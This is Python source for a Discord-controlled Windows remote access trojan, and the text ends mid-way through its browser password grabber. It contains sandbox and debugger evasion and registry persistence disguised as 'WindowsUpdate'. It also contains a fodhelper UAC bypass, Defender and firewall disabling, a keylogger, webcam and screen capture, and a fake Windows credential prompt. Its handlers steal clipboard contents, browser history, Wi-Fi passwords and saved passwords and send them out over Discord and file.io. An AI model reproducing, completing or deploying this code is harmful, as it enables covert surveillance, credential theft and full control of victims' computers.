import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import urllib.request
import urllib.parse
import urllib.error
import json
import base64
import hashlib
import re
import sqlite3
import shutil
import tempfile
import subprocess
from ctypes import *
import asyncio
import inspect


time.sleep(random.uniform(0.5, 1.5))


def is_sandbox():
    try:
        sandbox_indicators = ['vbox', 'vmware', 'virtual', 'sandbox', 'qemu']
        computer_name = os.getenv('COMPUTERNAME', '').lower()
        username = os.getenv('USERNAME', '').lower()
        for indicator in sandbox_indicators:
            if indicator in computer_name or indicator in username:
                return True
        import shutil
        total, used, free = shutil.disk_usage("C:\\")
        if free < 50 * 1024 * 1024 * 1024:
            return True
    except:
        pass
    return False

# Evasion: Anti-debug
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit()
        analysis_tools = ['procmon', 'wireshark', 'fiddler', 'burp', 'charles', 'x64dbg', 'ollydbg']
        for tool in analysis_tools:
            if tool in str(subprocess.getoutput('tasklist')).lower():
                sys.exit()
    except:
        pass

if is_sandbox():
    sys.exit()
anti_debug()

# Imports
__import__('discord')
__import__('discord.ext')
import discord
from discord.ext import commands
from discord import utils
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests
import cv2
import pyautogui
import win32gui
import win32con
import win32clipboard
import win32com.client as wincl
from pynput.keyboard import Key, Listener
import logging
from mss import mss
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write

# Random User-Agent rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
]

def get_ua():
    return random.choice(USER_AGENTS)

# Token
token = ''

global isexe
isexe = False
if sys.argv[0].endswith("exe"):
    isexe = True

global appdata, temp
appdata = os.getenv('APPDATA')
temp = os.getenv('temp')

# Discord intents
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='!', intents=intents)
ssl._create_default_https_context = ssl._create_unverified_context

# Help menu
helpmenu = """
Available commands are:

!unpersist
!persist
!message = Show a message box displaying your text / Syntax = "!message example"
!shell = Execute a shell command / Syntax = "!shell whoami"
!windowstart = Start logging current user window
!windowstop = Stop logging current user window
!voice = Make a voice say outloud a custom sentence
!admincheck = Check if program has admin privileges
!sysinfo = Gives info about infected computer
!history = Get chrome browser history
!download = Download a file from infected computer
!upload = Upload file to the infected computer
!cd = Changes directory
!delete = deletes a file
!write = Type your desired sentence on computer
!wallpaper = Change infected computer wallpaper
!clipboard = Retrieve infected computer clipboard content
!geolocate = Geolocate computer using IP address
!startkeylogger = Starts a keylogger
!stopkeylogger = Stops keylogger
!dumpkeylogger = Dumps the keylog
!volumemax = Put volume to max
!volumezero = Put volume at 0
!idletime = Get the idle time of user's on target computer
!listprocess = Get all process
!blockinput = Blocks user's keyboard and mouse
!unblockinput = Unblocks user's keyboard and mouse
!screenshot = Get the screenshot of the user's current screen
!exit = Exit program
!kill = Kill a session or all sessions
!uacbypass = attempt to bypass uac to gain admin
!passwords = grab all passwords
!streamscreen = stream screen by sending multiple pictures
!stopscreen = stop screen stream
!shutdown = shutdown computer
!restart = restart computer
!logoff = log off current user
!bluescreen = BlueScreen PC
!displaydir = display all items in current dir
!currentdir = display the current dir
!dateandtime = display system date and time
!prockill = kill a process by name
!recscreen = record screen for certain amount of time
!recaudio = record audio for certain amount of time
!disableantivirus = disable windows defender(requires admin)
!disablefirewall = disable windows firewall (requires admin)
!audio = play a audio file on the target computer(.wav only)
!selfdestruct = delete all traces that this program was on the target PC
!windowspass = attempt to phish password by poping up a password dialog
!displayoff = turn off the monitor
!displayon = turn on the monitors
!hide = hide the file by changing the attribute to hidden
!unhide = unhide the file
!ejectcd = eject the cd drive on computer
!retractcd = retract the cd drive on the computer
!critproc = make program a critical process
!uncritproc = make program non-critical
!website = open a website on the infected computer
!distaskmgr = disable task manager
!enbtaskmgr = enable task manager
!getwifipass = get all the wifi passwords
!startup = add file to startup
!getdiscordtokens = get discord tokens
!getrobloxcookies = get roblox cookies
!osint = OSINT - find emails, phone numbers, usernames
!clear = Clear messages in the channel (Admin only)
!webcampic = Take a picture from the webcam
!streamwebcam = streams webcam
!stopwebcam = stop webcam stream
!reccam = record camera for certain amount of time
"""

# Activity tracking
stop_threads = False
_thread = None

async def activity(client):
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        try:
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            window_displayer = discord.Game(f"Visiting: {current_window}")
            await client.change_presence(status=discord.Status.online, activity=window_displayer)
            await asyncio.sleep(random.uniform(0.8, 1.5))
        except:
            await asyncio.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    try:
        with urllib.request.urlopen("https://geolocation-db.com/json", timeout=10) as url:
            data = json.loads(url.read().decode())
            flag = data.get('country_code', 'XX')
            ip = data.get('IPv4', 'Unknown')
    except:
        flag = 'XX'
        ip = 'Unknown'
    
    total = []
    global number, channel_name
    number = 1
    channel_name = None
    
    for x in client.get_all_channels(): 
        total.append(x.name)
    
    for y in range(len(total)):
        if total[y].startswith("session"):
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            if result:
                biggest = max(map(int, result))
                number = biggest + 1
    
    channel_name = f"session-{number}"
    await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here New session opened {channel_name} | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
    
    if is_admin:
        await channel.send(f'{value1} | admin!')
    else:
        await channel.send(value1)
    
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

@client.event
async def on_message(message):
    global stop_threads, _thread, keylogger_thread, channel_name
    
    if message.channel.name != channel_name:
        return
    
    # Clear command
    if message.content.startswith("!clear"):
        if message.author.guild_permissions.administrator:
            try:
                amount = int(message.content.split()[1]) if len(message.content.split()) > 1 else 100
                if amount > 100:
                    amount = 100
                await message.channel.purge(limit=amount + 1)
                await message.channel.send(f"[*] Cleared {amount} messages", delete_after=3)
            except:
                await message.channel.send("[*] Invalid amount. Usage: !clear [1-100]")
        else:
            await message.channel.send("[!] Admin permissions required")
        return

    # Help command
    if message.content == "!help":
        temp_dir = os.getenv('TEMP')
        help_file = os.path.join(temp_dir, "helpmenu.txt")
        with open(help_file, 'w', encoding='utf-8') as f:
            f.write(str(helpmenu))
        file = discord.File(help_file, filename="helpmenu.txt")
        await message.channel.send("[*] Command executed", file=file)
        os.remove(help_file)
        return

    # Kill command
    if message.content.startswith("!kill"):
        try:
            if message.content[6:] == "all":
                for x in client.get_all_channels():
                    if x.name.startswith("session"):
                        await x.delete()
            else:
                channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                if channel_to_delete:
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed")
        except Exception as e:
            await message.channel.send(f"[!] Error: {e}")

    # Exit command
    if message.content == "!exit":
        try:
            uncritproc()
        except:
            pass
        await message.channel.send("[*] Exiting...")
        sys.exit()

    # Window start/stop
    if message.content == "!windowstart":
        stop_threads = False
        _thread = threading.Thread(target=between_callback, args=(client,))
        _thread.daemon = True
        _thread.start()
        await message.channel.send("[*] Window logging started")

    if message.content == "!windowstop":
        stop_threads = True
        await message.channel.send("[*] Window logging stopped")
        game = discord.Game("Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)

    # Screenshot
    if message.content == "!screenshot":
        try:
            with mss() as sct:
                screenshot_path = os.path.join(os.getenv('TEMP'), "monitor.png")
                sct.shot(output=screenshot_path)
            file = discord.File(screenshot_path, filename="monitor.png")
            await message.channel.send("[*] Screenshot taken", file=file)
            os.remove(screenshot_path)
        except Exception as e:
            await message.channel.send(f"[!] Screenshot failed")

        # Volume commands - WORKING VERSION
    if message.content == "!volumemax":
        try:
            # Use Windows API key simulation (always works)
            for _ in range(30):  # 30 key presses = max volume
                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                time.sleep(0.005)
                ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
            await message.channel.send("[*] Volume set to maximum")
        except:
            await message.channel.send("[!] Volume max failed - try running as admin")

    if message.content == "!volumezero":
        try:
            # Use Windows API key simulation (always works)
            for _ in range(30):  # 30 key presses = zero volume
                ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                time.sleep(0.005)
                ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
            await message.channel.send("[*] Volume set to zero")
        except:
            await message.channel.send("[!] Volume zero failed - try running as admin")
            
        # ============================================================
    # PERSIST - Add to Windows Startup
    # ============================================================
    if message.content == "!persist":
        await message.channel.send("[*] Adding to Windows startup...")
        
        try:
            # Get the current script/exe path
            if getattr(sys, 'frozen', False):
                # Running as compiled exe
                current_file = sys.executable
            else:
                # Running as .py script
                current_file = os.path.abspath(inspect.getfile(inspect.currentframe()))
            
            # Method 1: Startup folder (works without admin)
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            startup_path = os.path.join(startup_folder, os.path.basename(current_file))
            
            if not os.path.exists(startup_path):
                shutil.copy2(current_file, startup_path)
                await message.channel.send(f"[*] Added to startup folder: {startup_path}")
            else:
                await message.channel.send("[*] Already in startup folder")
            
            # Method 2: Registry Run key (requires admin, but we try anyway)
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, current_file)
                winreg.CloseKey(key)
                await message.channel.send("[*] Added to HKCU Run registry")
            except:
                pass
            
            await message.channel.send("[+] Persistence achieved! Bot will run on startup")
            
        except Exception as e:
            await message.channel.send(f"[!] Persist failed: {str(e)[:100]}")


    # ============================================================
    # UNPERSIST - Remove from Windows Startup
    # ============================================================
    if message.content == "!unpersist":
        await message.channel.send("[*] Removing from Windows startup...")
        
        try:
            # Get the current script/exe path
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = os.path.abspath(inspect.getfile(inspect.currentframe()))
            
            # Method 1: Remove from startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            startup_path = os.path.join(startup_folder, os.path.basename(current_file))
            
            if os.path.exists(startup_path):
                os.remove(startup_path)
                await message.channel.send("[*] Removed from startup folder")
            
            
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsUpdate")
                winreg.CloseKey(key)
                await message.channel.send("[*] Removed from HKCU Run registry")
            except:
                pass
            
            await message.channel.send("[-] Persistence removed! Bot will NOT run on next startup")
            
        except Exception as e:
            await message.channel.send(f"[!] Unpersist failed: {str(e)[:100]}")

    # Webcam picture
    if message.content == "!webcampic":
        try:
            temp_dir = os.getenv('TEMP')
            camera = cv2.VideoCapture(0)
            return_value, image = camera.read()
            if return_value:
                cam_path = os.path.join(temp_dir, "webcam.png")
                cv2.imwrite(cam_path, image)
                file = discord.File(cam_path, filename="webcam.png")
                await message.channel.send("[*] Webcam picture", file=file)
                os.remove(cam_path)
            del camera
        except:
            await message.channel.send("[!] Webcam failed")

    # Message box 
    if message.content.startswith("!message"):
        def mess():
            msg_text = message.content[8:].strip()
            if not msg_text:
                msg_text = "Notification"
            # MB_SYSTEMMODAL (0x1000) makes it stay on top
            ctypes.windll.user32.MessageBoxW(0, msg_text, "System Alert", 0x40 | 0x1000)
        
        msg_thread = threading.Thread(target=mess)
        msg_thread.daemon = True
        msg_thread.start()
        await message.channel.send(f"[*] Message box shown: {message.content[8:]}")

    # Wallpaper
    if message.content.startswith("!wallpaper") and message.attachments:
        try:
            path = os.path.join(os.getenv('TEMP'), "wallpaper.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await message.channel.send("[*] Wallpaper changed")
        except:
            await message.channel.send("[!] Failed")

    # Upload
    if message.content.startswith("!upload") and message.attachments:
        try:
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] File uploaded")
        except:
            await message.channel.send("[!] Upload failed")

    # Shell command
    if message.content.startswith("!shell"):
        try:
            instruction = message.content[7:]
            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = output.stdout.decode('CP437').strip()
            if out:
                if len(out) > 1990:
                    temp_file = os.path.join(os.getenv('TEMP'), "output.txt")
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(out)
                    file = discord.File(temp_file, filename="output.txt")
                    await message.channel.send("[*] Command executed", file=file)
                    os.remove(temp_file)
                else:
                    await message.channel.send(f"[*] Output: {out}")
            else:
                await message.channel.send("[*] No output")
        except:
            await message.channel.send("[!] Command failed")

    # Download
    if message.content.startswith("!download"):
        try:
            filename = message.content[10:]
            if os.path.exists(filename):
                file_size = os.stat(filename).st_size
                if file_size > 7340032:
                    await message.channel.send("File > 8MB, uploading to file.io...")
                    with open(filename, "rb") as f:
                        response = requests.post('https://file.io/', files={"file": f}).json()
                    await message.channel.send(f"Download link: {response.get('link', 'Failed')}")
                else:
                    file = discord.File(filename, filename=os.path.basename(filename))
                    await message.channel.send("[*] File attached", file=file)
            else:
                await message.channel.send("[!] File not found")
        except:
            await message.channel.send("[!] Download failed")

    # CD command
    if message.content.startswith("!cd"):
        try:
            os.chdir(message.content[4:])
            await message.channel.send(f"[*] Changed to {os.getcwd()}")
        except:
            await message.channel.send("[!] Failed")

    # Write/Type command
    if message.content.startswith("!write"):
        try:
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])
            await message.channel.send("[*] Typed")
        except:
            await message.channel.send("[!] Failed")

    # Browser history
    if message.content == "!history":
        try:
            username = os.getenv('USERNAME')
            chrome_history = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            if os.path.exists(chrome_history):
                temp_history = os.path.join(os.getenv('TEMP'), "history.db")
                shutil.copy2(chrome_history, temp_history)
                conn = sqlite3.connect(temp_history)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                urls = cursor.fetchall()
                history_text = "Recent Chrome History:\n\n"
                for url, title in urls:
                    history_text += f"{title}\n{url}\n\n"
                conn.close()
                os.remove(temp_history)
                
                if len(history_text) > 1990:
                    hist_file = os.path.join(os.getenv('TEMP'), "history.txt")
                    with open(hist_file, 'w', encoding='utf-8') as f:
                        f.write(history_text)
                    file = discord.File(hist_file, filename="history.txt")
                    await message.channel.send("[*] History", file=file)
                    os.remove(hist_file)
                else:
                    await message.channel.send(f"```{history_text}```")
            else:
                await message.channel.send("[!] No Chrome history found")
        except:
            await message.channel.send("[!] History failed")

    # Clipboard
    if message.content == "!clipboard":
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await message.channel.send(f"[*] Clipboard: {data}")
        except:
            await message.channel.send("[!] Could not read clipboard")

    # Sysinfo
    if message.content == "!sysinfo":
        try:
            import platform
            uname = platform.uname()
            info = f"System: {uname.system} {uname.release}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}"
            await message.channel.send(f"```{info}```")
        except:
            await message.channel.send("[!] Sysinfo failed")

    # GEOLOCATE - FIXED
    if message.content == "!geolocate":
        await message.channel.send("[*] Locating...")
        
        location_text = "```\nGEOLOCATION RESULTS\n"
        location_text += "=" * 50 + "\n\n"
        
        apis = [
            f"http://ip-api.com/json/?fields=status,country,city,region,lat,lon,isp,org,query",
            f"https://ipapi.co/json/",
            f"https://ipinfo.io/json"
        ]
        
        location_data = None
        for api_url in apis:
            try:
                req = urllib.request.Request(api_url, headers={'User-Agent': get_ua()})
                with urllib.request.urlopen(req, timeout=10) as response:
                    data = json.loads(response.read().decode())
                    if data.get('status') == 'success' or 'country' in data:
                        location_data = data
                        break
            except:
                continue
        
        if location_data:
            if 'query' in location_data:
                location_text += f"IP Address: {location_data.get('query', 'Unknown')}\n"
            elif 'ip' in location_data:
                location_text += f"IP Address: {location_data.get('ip', 'Unknown')}\n"
            
            location_text += f"Country: {location_data.get('country', location_data.get('country_name', 'Unknown'))}\n"
            location_text += f"City: {location_data.get('city', 'Unknown')}\n"
            location_text += f"Region: {location_data.get('region', 'Unknown')}\n"
            location_text += f"ISP: {location_data.get('isp', location_data.get('org', 'Unknown'))}\n"
            
            lat = location_data.get('lat', location_data.get('latitude'))
            lon = location_data.get('lon', location_data.get('longitude'))
            
            if lat and lon:
                location_text += f"Coordinates: {lat}, {lon}\n"
                location_text += f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n"
        else:
            location_text += "Could not determine location\n"
        
        location_text += "```"
        await message.channel.send(location_text)

    # VOICE 
    if message.content.startswith("!voice"):
        try:
            volumeup()
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            await message.channel.send("[*] Voice speaking")
        except:
            await message.channel.send("[!] Voice failed")

    # Admin check
    if message.content == "!admincheck":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        await message.channel.send("[*] You are admin!" if is_admin else "[!] You are not admin")

    # Keylogger commands
    if message.content == "!startkeylogger":
        try:
            log_file = os.path.join(os.getenv('TEMP'), "key_log.txt")
            logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s | %(message)s')
            
            def on_press(key):
                try:
                    if key == Key.space:
                        logging.info("[SPACE]")
                    elif key == Key.enter:
                        logging.info("[ENTER]")
                    elif key == Key.backspace:
                        logging.info("[BACKSPACE]")
                    elif hasattr(key, 'char') and key.char:
                        logging.info(key.char)
                    else:
                        logging.info(f"[{str(key).replace('Key.', '').upper()}]")
                except:
                    pass
            
            def run_keylogger():
                with Listener(on_press=on_press) as listener:
                    listener.join()
            
            keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
            keylogger_thread.start()
            await message.channel.send("[*] Keylogger started")
        except:
            await message.channel.send("[!] Keylogger failed")

    if message.content == "!stopkeylogger":
        await message.channel.send("[*] Keylogger stopped (restart required)")

    if message.content == "!dumpkeylogger":
        try:
            log_file = os.path.join(os.getenv('TEMP'), "key_log.txt")
            if os.path.exists(log_file):
                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                    logs = f.read()
                if logs:
                    await message.channel.send(f"```Keylog:\n{logs[:1900]}```")
                else:
                    await message.channel.send("[*] No logs")
            else:
                await message.channel.send("[*] No log file")
        except:
            await message.channel.send("[!] Dump failed")

    # Idle time
    if message.content == "!idletime":
        try:
            from ctypes import Structure, c_uint, sizeof, byref, windll
            class LASTINPUTINFO(Structure):
                _fields_ = [("cbSize", c_uint), ("dwTime", c_uint)]
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = sizeof(lastInputInfo)
            if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                idle_seconds = millis / 1000.0
                await message.channel.send(f"[*] Idle: {idle_seconds:.2f} seconds")
        except:
            await message.channel.send("[!] Failed")

    # Block/Unblock input
    if message.content.startswith("!blockinput"):
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            ctypes.windll.user32.BlockInput(True)
            await message.channel.send("[*] Input blocked")
        else:
            await message.channel.send("[!] Admin required")

    if message.content.startswith("!unblockinput"):
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            ctypes.windll.user32.BlockInput(False)
            await message.channel.send("[*] Input unblocked")
        else:
            await message.channel.send("[!] Admin required")

    # List processes
    if message.content == "!listprocess":
        try:
            result = subprocess.getoutput("tasklist")
            if len(result) > 1990:
                proc_file = os.path.join(os.getenv('TEMP'), "processes.txt")
                with open(proc_file, 'w') as f:
                    f.write(result)
                file = discord.File(proc_file, filename="processes.txt")
                await message.channel.send("[*] Process list", file=file)
                os.remove(proc_file)
            else:
                await message.channel.send(f"```{result}```")
        except:
            await message.channel.send("[!] Failed")

    # Kill process
    if message.content.startswith("!prockill"):
        try:
            proc = message.content[10:]
            subprocess.run(f'taskkill /IM "{proc}" /F', shell=True)
            await message.channel.send(f"[*] Killed {proc}")
        except:
            await message.channel.send("[!] Failed")

    # Current directory
    if message.content == "!currentdir":
        await message.channel.send(f"[*] {os.getcwd()}")

    # Display directory
    if message.content == "!displaydir":
        try:
            result = subprocess.getoutput('dir')
            if len(result) > 1990:
                dir_file = os.path.join(os.getenv('TEMP'), "dir.txt")
                with open(dir_file, 'w') as f:
                    f.write(result)
                file = discord.File(dir_file, filename="dir.txt")
                await message.channel.send("[*] Directory listing", file=file)
                os.remove(dir_file)
            else:
                await message.channel.send(f"```{result}```")
        except:
            await message.channel.send("[!] Failed")

    # Date and time
    if message.content == "!dateandtime":
        output = subprocess.getoutput('echo time = %time% date = %date%')
        await message.channel.send(f"[*] {output}")

    # Shutdown, restart, logoff
    if message.content == "!shutdown":
        uncritproc()
        os.system("shutdown /p")
        await message.channel.send("[*] Shutting down")

    if message.content == "!restart":
        uncritproc()
        os.system("shutdown /r /t 00")
        await message.channel.send("[*] Restarting")

    if message.content == "!logoff":
        uncritproc()
        os.system("shutdown /l /f")
        await message.channel.send("[*] Logging off")

    # Bluescreen
    if message.content == "!bluescreen":
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        except:
            pass

    # Delete file
    if message.content.startswith("!delete"):
        try:
            os.remove(message.content[8:])
            await message.channel.send("[*] Deleted")
        except:
            await message.channel.send("[!] Failed")

    # Disable antivirus
    if message.content == "!disableantivirus":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            os.system(r'powershell Add-MpPreference -ExclusionPath "C:\\"')
            await message.channel.send("[*] Defender exclusions added")
        else:
            await message.channel.send("[!] Admin required")

    # Disable firewall
    if message.content == "!disablefirewall":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            os.system(r"NetSh Advfirewall set allprofiles state off")
            await message.channel.send("[*] Firewall disabled")
        else:
            await message.channel.send("[!] Admin required")

    # Play audio
    if message.content.startswith("!audio") and message.attachments:
        try:
            audio_path = os.path.join(os.getenv('TEMP'), "audio.wav")
            await message.attachments[0].save(audio_path)
            vbs_path = os.path.join(os.getenv('TEMP'), "play.vbs")
            with open(vbs_path, 'w') as f:
                f.write(f'CreateObject("WMPlayer.OCX").URL = "{audio_path}"\nCreateObject("WMPlayer.OCX").controls.play\nWScript.Sleep 5000')
            os.system(f'start {vbs_path}')
            await message.channel.send("[*] Playing audio")
        except:
            await message.channel.send("[!] Failed")

    # Self destruct
    if message.content == "!selfdestruct":
        try:
            uncritproc()
            pid = os.getpid()
            script_path = inspect.getframeinfo(inspect.currentframe()).filename
            bat = f'@echo off\ntaskkill /F /PID {pid}\ndel "{script_path}" /F\ndel "%~f0"'
            bat_path = os.path.join(os.getenv('TEMP'), "destroy.bat")
            with open(bat_path, 'w') as f:
                f.write(bat)
            os.system(f'start /min {bat_path}')
            await message.channel.send("[*] Self destructing")
            sys.exit()
        except:
            pass

    # Windows password phishing
    if message.content == "!windowspass":
        try:
            cmd = 'Powershell "$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password"'
            result = subprocess.getoutput(cmd)
            await message.channel.send(f"[*] Password: {result}")
        except:
            await message.channel.send("[!] Failed")

    # Display off/on
    if message.content == "!displayoff":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
            await message.channel.send("[*] Display off")
        else:
            await message.channel.send("[!] Admin required")

    if message.content == "!displayon":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            pyautogui.press('esc')
            await message.channel.send("[*] Display on")
        else:
            await message.channel.send("[!] Admin required")

    # Hide/Unhide file
    if message.content == "!hide":
        script_path = inspect.getframeinfo(inspect.currentframe()).filename
        os.system(f'attrib +h "{script_path}"')
        await message.channel.send("[*] File hidden")

    if message.content == "!unhide":
        script_path = inspect.getframeinfo(inspect.currentframe()).filename
        os.system(f'attrib -h "{script_path}"')
        await message.channel.send("[*] File unhidden")

    # CD eject/retract
    if message.content == "!ejectcd":
        ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)
        await message.channel.send("[*] CD ejected")

    if message.content == "!retractcd":
        ctypes.windll.WINMM.mciSendStringW('set cdaudio door closed', None, 0, None)
        await message.channel.send("[*] CD retracted")

    # Critical process
    if message.content == "!critproc":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            critproc()
            await message.channel.send("[*] Critical process")
        else:
            await message.channel.send("[!] Admin required")

    if message.content == "!uncritproc":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            uncritproc()
            await message.channel.send("[*] Non-critical process")
        else:
            await message.channel.send("[!] Admin required")

    # Open website
    if message.content.startswith("!website"):
        try:
            url = message.content[9:]
            if not url.startswith('http'):
                url = 'http://' + url
            os.system(f'start {url}')
            await message.channel.send("[*] Website opened")
        except:
            await message.channel.send("[!] Failed")

    # Disable/Enable task manager
    if message.content == "!distaskmgr":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            os.system('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
            await message.channel.send("[*] Task manager disabled")
        else:
            await message.channel.send("[!] Admin required")

    if message.content == "!enbtaskmgr":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            os.system('powershell Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Force')
            await message.channel.send("[*] Task manager enabled")
        else:
            await message.channel.send("[!] Admin required")

    # Get WiFi passwords
    if message.content == "!getwifipass":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            try:
                output = subprocess.getoutput('netsh wlan show profile key=clear')
                await message.channel.send(f"```{output[:1900]}```")
            except:
                await message.channel.send("[!] Failed")
        else:
            await message.channel.send("[!] Admin required")

    # Add to startup
    if message.content == "!startup":
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            try:
                script_path = sys.argv[0]
                startup = f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                shutil.copy2(script_path, startup)
                await message.channel.send("[*] Added to startup")
            except:
                await message.channel.send("[!] Failed")
        else:
            await message.channel.send("[!] Admin required")

    # UAC Bypass
    if message.content == "!uacbypass":
        try:
            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
            os.system('powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force')
            os.system(f'powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(Default)" -Value \'cmd /c start "" "{current_dir}"\' -Force')
            os.system("fodhelper.exe")
            time.sleep(2)
            os.system('powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force')
            await message.channel.send("[*] UAC bypass attempted")
        except:
            await message.channel.send("[!] Failed")

    # Passwords grabber
    if message.content == "!passwords":
        await message.channel.send("[*] Scanning for passwords...")
        try:
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            
            browsers = {
                "Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                "Edge": local + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
            }
            
            all_passwords = []
            for browser_name, login_path in browsers.items():
                if os.path.exists(login_path):
                    temp_db = os.path.join(os.getenv('TEMP'), f"{browser_name}_login.db")
                    shutil.copy2(login_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        if row[1] and row[2]:
                            all_passwords.append(f"[{browser_name}] {row[0]}\nUser: {row[1]}\nPass: {row[2]}\n")
                    
                    conn.close()
                    os.remove(temp_db)
            
            if all_passwords:
                pwd_text = "PASSWORDS FOUND\n\n" + "\n".join(all_passwords[:30])
                if len(pwd_text) > 1900:
                    pwd_file = os.path.join(os.getenv('TEMP'), "passwords.txt")
                    with open(pwd_file, 'w', encoding='utf-8') as f:
                        f.write(pwd_text)
                    file = discord.File(pwd_file, filename="passwords.txt")
                    await message.channel.send("[*] Passwords found", file=file)
                    os.remove(pwd_file)
                else:
                    await message.channel.send(f"```{pwd_text}```")
            else:
